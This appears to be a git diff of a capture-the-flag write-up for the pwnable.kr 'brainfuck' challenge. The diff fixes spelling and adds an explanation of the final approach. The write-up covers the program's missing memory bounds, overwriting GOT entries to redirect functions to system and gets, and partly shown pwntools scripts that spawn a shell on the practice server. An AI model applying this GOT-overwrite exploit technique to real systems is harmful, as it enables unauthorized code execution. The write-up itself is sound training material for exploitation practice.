@@ -1,20 +1,20 @@
-# Pwnable.kr brainfuck CTF Writeup
+# Pwnable.kr Brainfuck CTF Writeup
 
-## brainfuck basics
-The syntex of brainfuck is very simple:
+## Brainfuck Basics
+The syntax of Brainfuck is very simple:
 ```
 > = increases memory pointer, or moves the pointer to the right 1 block.
 < = decreases memory pointer, or moves the pointer to the left 1 block.
-+ = increases value stored at the block pointed to by the memory pointer
-- = decreases value stored at the block pointed to by the memory pointer
-[ = like c while(cur_block_value != 0) loop.
-] = if block currently pointed to's value is not zero, jump back to [
-, = like c getchar(). input 1 character.
-. = like c putchar(). print 1 character to the console
++ = increases value stored at the block pointed to by the memory pointer.
+- = decreases value stored at the block pointed to by the memory pointer.
+[ = like C while(cur_block_value != 0) loop.
+] = if block currently pointed to's value is not zero, jump back to [.
+, = like C getchar(). Inputs 1 character.
+. = like C putchar(). Prints 1 character to the console.
 ```
 
-## Problem Description  
-The exactubale for this challange recive brainfuck code and excute it. When decompiling the elf file, we get this:
+## Problem Description
+The executable for this challenge receives Brainfuck code and executes it. When decompiling the ELF file, we get this:
 ### main
 ```c
 08048671  int32_t main(int32_t argc, char** argv, char** envp)
@@ -100,20 +100,20 @@ The exactubale for this challange recive brainfuck code and excute it. When deco
 08048670      return p_1;
 080485dc  }
 ```
-As you can see, the `[` and `]` are not supported. Our goal is to find a bug and exploit it to get a shell. 
+As you can see, the `[` and `]` are not supported. Our goal is to find a bug and exploit it to get a shell.
 
-## Analysis  
-The vunrability in this program is that there are not boundries in memory, so we can change the pointer `p` to any location we want and read/write to it.
-### #1 idea
-My first idea was to overwrite the got (global offset table) so that some function the program use (like `getchar()`) will have the address of a functiion I will create, which will be:
+## Analysis
+The vulnerability in this program is that there are no boundaries in memory, so we can change the pointer `p` to any location we want and read/write to it.
+### #1 Idea
+My first idea was to overwrite the GOT (Global Offset Table) so that some function the program uses (like `getchar()`) will have the address of a function I will create, which will be:
 ```c
 void main(){
   system("/bin/sh");
 }
 ```
-Scince `system` is not in the got, I would need to find the base address of libc, and add to it the `system` offset (by looking in the `so` file).
-To find the base address on libc, I would use brainfuck to move to the got and read the address of some function, and than i would substruct this address with the offset of this function in so `so` file.
-I also used this methond for the string "/bin/sh/". So at the end, my function looked like this:
+Since `system` is not in the GOT, I would need to find the base address of libc and add to it the `system` offset (by looking in the `.so` file).
+To find the base address of libc, I would use Brainfuck to move to the GOT and read the address of some function, and then subtract this address with the offset of this function in the `.so` file.
+I also used this method for the string "/bin/sh". So at the end, my function looked like this:
 ```asm
 BITS 32
 section .text
@@ -121,9 +121,9 @@ section .text
 push dword [0xf7ed8b2b]
 call 0xf7dc5170
 ```
-*Note:* when i solved this, i havent noticed there is ASLR, so this should not work.
-I than converted this asm file to hex, and write this hex to memory using brainfuck. The brainfuck pointer of the program starts at `0x804a0a0`, so this is where my function start.
-I than change the `getchar()` function in the got to point to my function (which is in `0x804a0a0`). This is the Exploit code:
+*Note:* When I solved this, I hadn't noticed there was ASLR, so this should not work.
+I then converted this assembly file to hex and wrote this hex to memory using Brainfuck. The Brainfuck pointer of the program starts at `0x804a0a0`, so this is where my function starts.
+I then changed the `getchar()` function in the GOT to point to my function (which is at `0x804a0a0`). This is the exploit code:
 ```python
 from pwn import *
 
@@ -145,13 +145,14 @@ p.send(payload)
 p.interactive()
 session.close()
 ```
-However, when i run this, it didnt work because of a simple reason: the NX bit was enabled. The NX bit is a security feature in modern processors that marks certain memory regions (like `.bss`) as non-executable. I wrote my function in the `.bss` section, so it couldnt run because of it.
+However, when I ran this, it didn't work because of a simple reason: the NX bit was enabled. The NX bit is a security feature in modern processors that marks certain memory regions (like `.bss`) as non-executable. I wrote my function in the `.bss` section, so it couldn't run because of it.
 
-### #2 idea
-For my second idea, i went for a diffrent approch. I understood that `system` should be one of the function that the program already using. So my was to change some function i can call (like `putchar`) in the got to the `main` function and change `strlen` to system. In that way, i can also run my brainfuck code (and change the got) and also use the `fgets` in the second run to write "/bin/sh" to a buffer which `strlen` use, resulting the calling of `system("/bin/sh")`.
-However, it also didnt work. Thats because in the first run, when i change the address of `strlen` in the got, the program is using the new address of `strlen` while in the loop, which cause the rest of the brainfuck code to not run.
+### #2 Idea
+For my second idea, I took a different approach. I understood that `system` should be one of the functions that the program already uses. So my plan was to change some function I could call (like `putchar`) in the GOT to the `main` function and change `strlen` to `system`. In that way, I could also run my Brainfuck code (and change the GOT) and also use the `fgets` in the second run to write "/bin/sh" to a buffer which `strlen` uses, resulting in the calling of `system("/bin/sh")`.
+However, it also didn't work. That's because in the first run, when I changed the address of `strlen` in the GOT, the program used the new address of `strlen` while in the loop, which caused the rest of the Brainfuck code to not run.
 
-### #3 ides (and last!)
+### #3 Idea (and Last!)
+Instead of changing the `strlen` function, I changed the `fgets` function to `system` and the `memset` function to `gets`. That's because I wanted to write "/bin/sh" to `buf`, so I needed to replace `memset` with some function that writes my input to memory. However, the only function I could use was `gets`, because it only takes one argument. So when calling `memset(&buf, 0, 0x400);`, it only uses the first argument (`&buf`), which results in calling `gets(&buf)`, which is exactly what I needed. Afterwards, there is `fgets(&buf, 0x400, stdin);`, and here the program also only uses the first argument, resulting in `system(&buf)`. In `buf`, I would write "/bin/sh", so eventually it will run `system("/bin/sh")` and give me a shell.
 
 ## Exploit Code
 ```python
@@ -159,10 +160,10 @@ from pwn import *
 
 context(log_level='debug', os='linux', arch='i386')
 
-session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest')
+session = ssh(user='brainfuck', host='pwnable.kr', port=2222, password='guest') # When I solved this challenge, nc did not work
 p = session.process('./brainfuck')
 
-# Local files for finding offsets (which do not affected by ASLR)
+# Local files for finding offsets (which are not affected by ASLR)
 e = ELF(r'/mnt/c/users/dalal/desktop/private_projects/ctf/pwnable.kr/brainfuck/brainfuck')
 libc = ELF(r'/usr/lib32/libc.so.6')
 
@@ -202,7 +203,6 @@ payload += ",>" * 4
 
 # Trigger main() by calling putchar
 payload += "."
-
 
 p.sendlineafter(b"type some brainfuck instructions except [ ]\n", payload.encode())
 sleep(0.1)
